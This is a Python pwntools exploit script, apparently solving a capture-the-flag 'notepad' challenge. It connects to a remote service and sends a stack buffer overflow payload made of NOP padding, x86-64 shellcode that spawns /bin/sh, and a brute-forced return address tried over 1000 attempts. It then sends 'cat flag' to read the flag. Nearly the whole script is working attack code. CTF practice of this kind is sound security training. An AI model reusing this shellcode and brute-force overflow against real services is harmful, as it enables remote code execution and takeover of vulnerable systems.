from pwn import *
import time

def attack(i):
    # p = process("./notepad")
    p = remote("140.115.59.7", 11003)
    # p = remote("ctf.adl.tw", 11003)
    print(p.recv())
    # raw_input("attach gdb")

    padding = b"\x90" * 80

    # RIP = p64(0x4242424243434343) #CCCCBBBB
    # RIP = p64(0x7fffffffe0f0) #Previous Address
    # RIP = p64(0x7fffffffe170) #Previous Address
    # RIP = p64(0x7fffffffe180) #Previous Address
    # RIP = p64(0x7fffffffdf70) # return At 0x7fffffffdfb8
    RIP = p64(0x7fffffff00f0 + 0x10 * i) # return At 0x7fffffffdfb8
    print("Trying:", RIP)

    shellcode = b"""\x48\x83\xC4\x10\xEB\x0A\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6A\x42\x58\xFE\xC4\x48\x99\x52\xEB\x06\x90\x90\x90\x90\x90\x90\x49\x89\xD0\x49\x89\xD2\xEB\x08\x90\x90\x90\x90\x90\x90\x90\x90\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\xEB\x04\x90\x90\x90\x90\x57\x54\x5E\x0F\x05"""
    tail = b"\x90" * 3


    p.sendline(padding + shellcode + tail + RIP)
    p.sendline("cat flag")
    # p.interactive()
    p.close()
    time.sleep(1)

for i in range(1000):
    print("Iteration: ", i)
    attack(i)
# attack(110)
# 116
#108